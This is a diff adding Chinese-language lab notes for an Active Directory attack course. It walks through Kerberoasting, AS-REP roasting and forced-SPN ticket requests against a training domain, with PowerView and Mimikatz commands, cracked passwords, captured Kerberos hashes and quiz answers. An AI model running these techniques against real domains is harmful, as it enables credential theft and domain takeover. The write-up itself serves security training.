@@ -2612,3 +2612,440 @@ gwmi -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.lo
 问题：SDDL string that provides studentx same permissions as BA on root\cimv2 WMI namespace. Flag value is the permissions string from (A;CI;Permissions String;;;SID)
 
 答案：CCDCLCSWRPWPRCWD
+
+# Learning Objective 14:
+
+> Task
+> ● Using the Kerberoast attack, crack password of a SQL server service account.
+
+
+## 什么是SPN？
+> SPN(Service Principal name)服务器主体名称。
+> 在使用 Kerberos 身份验证的网络中，必须在内置计算机帐户（如 NetworkService 或 LocalSystem）或用户帐户下为服务器注册 SPN。对于内置帐户，SPN 将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户手动注册SPN。
+
+
+查找所有SPN，会有很多返回，但主要查看域管理员开启的服务
+```
+PS C:\ad> Get-NetUser -spn |select userprincipalname,serviceprincipalname
+
+userprincipalname serviceprincipalname
+----------------- --------------------
+                  kadmin/changepw
+websvc            {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
+svcadmin          {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
+```
+
+因为svcadmin是一个域管理员，所以我们可以以它开启的服务请求一个tikcet
+
+```
+PS C:\ad> Add-Type -AssemblyName System.IdentityModel
+PS C:\ad> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+
+
+Id                   : uuid-3d512be4-7ade-4394-bec6-e844aa7c77fb-1
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/15/2022 6:56:27 AM
+ValidTo              : 2/15/2022 3:04:38 PM
+ServicePrincipalName : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+```
+
+现在用klist命令查看我们是否有这个服务的TGS
+```
+PS C:\ad> klist
+
+Current LogonId is 0:0x3114e90c
+
+Cached Tickets: (11)
+
+<略>
+#2>     Client: svcadmin @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 2/14/2022 22:56:27 (local)
+        End Time:   2/15/2022 7:04:38 (local)
+        Renew Time: 2/21/2022 1:34:38 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
+<略>
+```
+
+有MSSQLSvc的TGS
+
+用Mimikatz dump出tikets
+```
+PS C:\ad> . .\Invoke-Mimikatz.ps1
+PS C:\ad> Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # kerberos::list /export
+
+<略>
+[00000002] - 0x00000017 - rc4_hmac_nt
+   Start/End/MaxRenew: 2/14/2022 10:56:27 PM ; 2/15/2022 7:04:38 AM ; 2/21/2022 1:34:38 AM
+   Server Name       : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
+   Client Name       : svcadmin @ DOLLARCORP.MONEYCORP.LOCAL
+   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
+   * Saved to file     : 2-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+<略>
+```
+
+在当前目录生成了一个TGS文件```2-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi```
+
+拷贝到文件夹```kerberoast```，使用```tgsrepcrack.py```破解密码
+
+```
+PS C:\ad> cd .\kerberoast\
+PS C:\ad\kerberoast> python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+found password for ticket 0: *ThisisBlasphemyThisisMadness!!  File: .\2-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+All tickets cracked!
+```
+
+密码是：```*ThisisBlasphemyThisisMadness!!```
+
+得到了svcadmin明文密码，现在可以用下面命令登录到dcorp-mgmt,提权到域管理员。
+```
+Enter-PSSession –Computername dcorp-mgmt –credential dcorp\svcadmin
+```
+问题：SPN for which a TGS is requested
+答案：MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local
+
+# Learning Objective 15:
+>Task
+>● Enumerate users that have Kerberos Preauth disabled.
+>● Obtain the encrypted part of AS-REP for such an account.
+>● Determine if studentx has permission to set User Account Control flags for any user.
+>● If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.
+
+枚举禁用了Kerberos预认证的用户
+这里要注意引用的是dev版本的PowerView
+
+然后遇到一个坑是，突然之间学生机跟域的连接好像断掉了，排查了好久。然后我重启了VM就好了。。。
+
+```
+PS C:\ad> . .\PowerView_dev.ps1
+PS C:\ad> Get-DomainUser -PreauthNotRequired -Verbose
+Exception calling "GetNames" with "1" argument(s): "Value cannot be null.
+Parameter name: enumType"
+At C:\ad\PowerView_dev.ps1:5132 char:9
++         $UACValueNames = [Enum]::GetNames($UACEnum)
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : ArgumentNullException
+
+New-DynamicParameter : Cannot validate argument on parameter 'ValidateSet'. The argument is null or empty. Provide an
+argument that is not null or empty, and then try the command again.
+At C:\ad\PowerView_dev.ps1:5136 char:59
++ ... -DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ( ...
++                                                    ~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidData: (:) [New-DynamicParameter], ParameterBindingValidationException
+    + FullyQualifiedErrorId : ParameterArgumentValidationError,New-DynamicParameter
+
+VERBOSE: [Get-DomainSearcher] search base:
+LDAP://DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL/DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL
+VERBOSE: [Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate
+VERBOSE: [Get-DomainUser] filter string:
+(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
+The right operand of '-as' must be a type.
+At C:\ad\PowerView_dev.ps1:3180 char:17
++ ...             $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccoun ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : AsOperatorRequiresType
+
+The right operand of '-as' must be a type.
+At C:\ad\PowerView_dev.ps1:3187 char:17
++ ...               $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : AsOperatorRequiresType
+
+
+
+logoncount            : 1
+badpasswordtime       : 12/31/1600 4:00:00 PM
+distinguishedname     : CN=VPN359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+objectclass           : {top, person, organizationalPerson, user}
+displayname           : VPN359User
+lastlogontimestamp    : 9/12/2021 10:18:51 PM
+userprincipalname     : VPN359user
+name                  : VPN359User
+objectsid             : S-1-5-21-1874506631-3219952063-538504511-45125
+samaccountname        : VPN359user
+codepage              : 0
+accountexpires        : NEVER
+countrycode           : 0
+whenchanged           : 9/13/2021 5:18:51 AM
+instancetype          : 4
+usncreated            : 495969
+objectguid            : 85dce89b-bacf-4611-80c8-964999151887
+sn                    : user
+lastlogoff            : 12/31/1600 4:00:00 PM
+objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
+dscorepropagationdata : {11/25/2020 11:40:34 AM, 1/1/1601 12:00:00 AM}
+givenname             : VPN359
+lastlogon             : 9/12/2021 10:18:51 PM
+badpwdcount           : 0
+cn                    : VPN359User
+whencreated           : 11/25/2020 11:40:34 AM
+primarygroupid        : 513
+pwdlastset            : 11/25/2020 3:40:34 AM
+usnchanged            : 529513
+```
+
+使用ASREPRoast.ps1获取kerb哈希值，这个值可以使用john等破解工具破解
+```
+PS C:\ad> cd .\ASREPRoast-master\
+PS C:\ad\ASREPRoast-master> . .\ASREPRoast.ps1
+PS C:\ad\ASREPRoast-master> Get-ASREPHash -UserName VPN359user -Verbose
+VERBOSE: [Get-ASREPHash] DC server IP '172.16.2.1' resolved from current domain
+VERBOSE: [Get-ASREPHash] Bytes sent to '172.16.2.1': 196
+VERBOSE: [Get-ASREPHash] Bytes received from '172.16.2.1': 1498
+$krb5asrep$VPN359user@dollarcorp.moneycorp.local:0550211c4e62a02b8a792f801a55d5f5$765361c9f812235d1be0449b49155974feeba51e85f78e471079ec18f5437618ec1fcc5fca4b21a404b9776a31b42bf46781ff7c689de4fcde343e90a1d9441976c16f90695192ef5a683b8de4e907f423e9d898e7776cb4791b756700633f1295b77d89134bbc5c8ae93935801bf900efb554b9
+```
+
+tool里面没有JTR，去到kali破解这个哈希
+
+
+
+枚举RDPUsers组成员对其中有GenericWrite 或者 GenericAll权限的用户
+```
+PS C:\ad> . .\PowerView_dev.ps1
+PS C:\ad> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-1874506631-3219952063-538504511-36147' to a
+distinguishedname with Convert-ADName
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-1874506631-3219952063-538504511-36147' to a
+distinguishedname with Convert-ADName
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-1874506631-3219952063-538504511-36147' to a
+distinguishedname with Convert-ADName
+
+
+ObjectDN                : CN=Control359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-1874506631-3219952063-538504511-1116
+IdentityReferenceName   : RDPUsers
+IdentityReferenceDomain : dollarcorp.moneycorp.local
+IdentityReferenceDN     : CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+IdentityReferenceClass  : group
+
+ObjectDN                : CN=Control360User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : GenericAll
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-1874506631-3219952063-538504511-1116
+IdentityReferenceName   : RDPUsers
+IdentityReferenceDomain : dollarcorp.moneycorp.local
+IdentityReferenceDN     : CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+IdentityReferenceClass  : group
+(略)
+```
+
+因为当前账号（student366）在RDPUsers组中，而RDPUsers组对上面这些用户有GenericAll或者GenericWrite的权限，所以可以强制关闭这些用户的预认证
+```
+PS C:\ad> Set-DomainObject -Identity Control359User -XOR @{useraccountcontrol=4194304} -Verbose
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL/DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
+(&(|(|(samAccountName=Control359User)(name=Control359User)(displayname=Control359User))))
+VERBOSE: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for object 'Control359user'
+```
+
+关闭以后获取这个用户的krb5哈希
+```
+PS C:\ad\ASREPRoast-master> Get-ASREPHash -UserName Control359User -Verbose
+VERBOSE: [Get-ASREPHash] DC server IP '172.16.2.1' resolved from current domain
+VERBOSE: [Get-ASREPHash] Bytes sent to '172.16.2.1': 200
+VERBOSE: [Get-ASREPHash] Bytes received from '172.16.2.1': 1538
+$krb5asrep$Control359User@dollarcorp.moneycorp.local:709bbc1014a90187f95a2e6ca2a291e2$142ccda8eee6138cf3633ea1ad552b364227257a0869cbb25a641b5a3fca25737e362de008e6265d2e14a3ea3431d2936b6729aac7efc5d304996763eddbe9a76899e9575a2fdcc8abe2ea89f87589cea1198e2ed7bcdddbfebbfe194
+a1f72c43b28f23728454a1000a524f0c988b51aca49201b6c1126e4fcef6b86f430252068b3913ccf8c97575c620d9b8c630fd69efb6eb9eacf0ccd3d5e41b43e40104474148e486eaf446355229f99e5f9c162bd8a1f09794d81c2c1907625d010ce6cc7aeeab559bea9e148a10e50e3eacfc601f8add19315d38933a6384fddd5fa7a3cb92895
+15fe08ac1bc9a38ac14a950409eb4e0b8fb01abd336ec60bd9f7ef4f24e38c82096c7dbc
+```
+
+问题： UserAccountControl flag set on ControlXuser
+答案： 4194304
+
+
+# Learning Objective 16:
+
+> Task
+> ● Determine if studentx has permissions to set UserAccountControl flags for any user.
+> ● If yes, force set a SPN on the user and obtain a TGS for the user.
+
+
+从下面结果可以知道当前账号（student366，是RDPUsers组的成员），对下面显示的账号是有GenericAll权限的
+```
+PS C:\ad> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} |select ObjectDN,ActiveDirectoryRights
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-1874506631-3219952063-538504511-36147' to a distinguishedname with
+Convert-ADName
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-1874506631-3219952063-538504511-36147' to a distinguishedname with
+Convert-ADName
+WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-1874506631-3219952063-538504511-36147' to a distinguishedname with
+Convert-ADName
+
+ObjectDN                                                       ActiveDirectoryRights
+--------                                                       ---------------------
+CN=Control359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Control360User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Control361User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Control362User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Control363User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Control364User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Control365User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Control366User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Control367User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Control368User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Control369User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Control370User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Support359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Support360User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Support361User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Support362User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Support363User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Support364User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Support365User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Support366User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Support367User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Support368User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Support369User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+CN=Support370User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
+```
+
+选择Support370User用户，查询这个账号是否有SPN
+
+```
+PS C:\ad> Get-DomainUser -Identity Support370User | select serviceprincipalname
+
+
+serviceprincipalname
+--------------------
+```
+
+
+因为本账号（student366，是RDPUsers组的成员），对这个用户有GenericAll权限，我们可以为其设置一个SPN
+
+```
+PS C:\ad> Set-DomainObject -Identity Support370User -Set @{serviceprincipalname='dcorp/whateverX'} -Verbos
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL/DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=Support370User)(name=Support370User)(displayname=Support370User))))
+VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'dcorp/whateverX' for object 'Support370user'
+```
+
+现在我们再次获取这个账号的SPN
+```
+PS C:\ad> Get-DomainUser -Identity Support370User | select serviceprincipalname
+serviceprincipalname
+--------------------
+dcorp/whateverX
+```
+
+现在，根据这个SPN，我们可以请求一个可以被破解的ticket
+```
+Cached Tickets: (0)
+PS C:\ad> Add-Type -AssemblyNAme System.IdentityModel
+PS C:\ad> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "dcorp/whateverX"
+
+
+Id                   : uuid-0230be8f-1cbc-4347-ac11-f1ba5519a667-2
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/15/2022 10:36:31 AM
+ValidTo              : 2/15/2022 8:36:31 PM
+ServicePrincipalName : dcorp/whateverX
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+```
+
+使用klist命令列出SPN
+```
+PS C:\ad> klist
+
+Current LogonId is 0:0x2a582
+
+Cached Tickets: (2)
+
+#0>     Client: student366 @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 2/15/2022 2:36:31 (local)
+        End Time:   2/15/2022 12:36:31 (local)
+        Renew Time: 2/22/2022 2:36:31 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
+
+#1>     Client: student366 @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: dcorp/whateverX @ DOLLARCORP.MONEYCORP.LOCAL
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 2/15/2022 2:36:31 (local)
+        End Time:   2/15/2022 12:36:31 (local)
+        Renew Time: 2/22/2022 2:36:31 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
+```
+
+看到已经有dcorp/whateverX的SPN
+
+用mimikatz导出
+```
+PS C:\ad> . .\Invoke-Mimikatz.ps1
+PS C:\ad> Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # kerberos::list /export
+
+[00000000] - 0x00000012 - aes256_hmac
+   Start/End/MaxRenew: 2/15/2022 2:36:31 AM ; 2/15/2022 12:36:31 PM ; 2/22/2022 2:36:31 AM
+   Server Name       : krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
+   Client Name       : student366 @ DOLLARCORP.MONEYCORP.LOCAL
+   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
+   * Saved to file     : 0-40e10000-student366@krbtgt~DOLLARCORP.MONEYCORP.LOCAL-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+
+[00000001] - 0x00000017 - rc4_hmac_nt
+   Start/End/MaxRenew: 2/15/2022 2:36:31 AM ; 2/15/2022 12:36:31 PM ; 2/22/2022 2:36:31 AM
+   Server Name       : dcorp/whateverX @ DOLLARCORP.MONEYCORP.LOCAL
+   Client Name       : student366 @ DOLLARCORP.MONEYCORP.LOCAL
+   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
+   * Saved to file     : 1-40a10000-student366@dcorp~whateverX-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+```
+
+导出来的tiket可以用tgsrepcrack.py破解
+
+也可以用powerview导出krb5哈希，然后再用john破解
+```
+PS C:\ad> Get-DomainUser -Identity Support370User | Get-DomainSPNTicket | select -ExpandProperty Hash
+
+$krb5tgs$23$*Support370user$dollarcorp.moneycorp.local$dcorp/whateverX*$CEBC7827456EC573D18BF59B70E86E35$52EB351B79C805C62B0B761E8E6DCD920FEEB836572AD932876A925CB0732521C0B7D912AF9987CC507C921A602F7CC403153B39E0C612ADC9788436E1F9CAEC5AD716E3B920A004D2D23FE2EB1AF3860C4F03
+188E61F473949ED578399DEF6FD9985789CE86E1F703F189C3877181DA93681B5C02BF55A8262BC953586C72FE18B04C1BA01381C124BAD6A3D00317D90592D5728524D708328D34D22EEBC77D3EFD81A576795416FF24140AE866450D050BCEE44C13198F6F11B7BC6472B04CE72CE356F7BB47135E2C2576982DBC04CCD8F1667689EF73B43C8
+CD0E649DDF72818300AE9B1FC817D93B30B8F8CDA6B383AEFBE6BDA3560F589CF464709A7A0F9668DB7F11328E11C71AF2AE23B31F8A15E367F12DDBFE29301D2A48F762C3ACDD321BB38ED85B37CE065979513C5E7C506F66DD06521D5547FC9A002256E432A4F36D543F3968ED77A15B40D38AA224B950D246AD6BE895242DFAAF8034281AD5B
+2E31762D3D3FB6E59C23EE6E81E6EC39136C90B1A2A9B407ADAF1844AAF7DEFC6612017BEC23F0E30D905D831011951C5CC9F3454BD92EC88FE5FE0410CE00EADE2ACCE08CA923D9E524E5D37DFD0ABB18A8E8711D890EBBDA86F4C68BAE246279EF1DEC139F9F75C3A81E0F0E3E7D3F9815CBF236204F8E92EAA045AEAA31A563A39F97FA0A433
+764603DAD1B6DEF4CFE79F14CD0642094A6DA407BBD7202BE5B1E352D0410A2536AC2996CF4E37060A89B2878E75731E6FFE20BB7A50AF4D52048C6E7AFBC3CE311C98BBDE824B9F3262FA389ADAC046FD19E6F4F147BC7622F571ED6FF1DB077CA938905B8717B576B78310B6B17CF91D626E0C20F3555EDB37C0099E5659EEEACCA72DB4608CF
+A704FD2DED042703A35BE2433399E7C2A08A053C4A13299F7A43CDA0865233385D027B14E0B224AF8B4D8FBF92BE9945CB06B05A321EE4D3DD03FABA975F85EC647691B35ABDDBD3BB1E568F95C0DF859DDF868D764F1CEDE4EE9552143E7AF44DEA7085208F9B480148C1E988538B4BAE7D85FB10D95B469D6B248BE8EA687B09067B8D87E9881
+D1AFFDCB79B64080901C57A7061833A1431701027FE7BB1B59BB6A765274EC85BD69C12E88853AF26876DDC8F0F7FF69E4E34ECF4AA46742839ACED31CDEB55FD06B8E45CF6AC8ACDE691386B4C2E823DEA2D5C22D172272BE0F2BC91C1796826F0BCBF4EAF9844B4BCB564E9C5DADFC48B5C3F5DE291CF1B373598D30AAF20612B31FCAB092F8F
+16EE3EA4EF32E2DC51005C54A251389687465DC02AF8BCE4E7ED78D1BC48E8201E5EBF43BAB7213E8E9DC2269BF23CEA20129D0A7DFE82617BAB722BA529D58A6543285E51F5E4A305AB5BF349CE5A70134AF2274F07E4723E6FA3F261A2DEE3D6AAB3C6304204D3DF00A30C7CA42575CC124F1A5DF409E2841287B60026F51F6007DF3FD6E7693
+FD0DA5023220EA4A907373975097089BDA68A5AFBED714387DBC299FC96F94A8F5738FB270FDF7C2A276913D884D5489399C0421543DCEDA72BE7077CE1682214F8E0A6D1B87E00985651BE0B4CB5B77975A3801063DEF73A80FF901EF3B086DDBDAB336E6325C6DBBF1CE6E91473DDCAF2807CA4F47066
+```
+
+问题：Which group has GenericAll rights over SupportXuser
+答案：RDPUsers
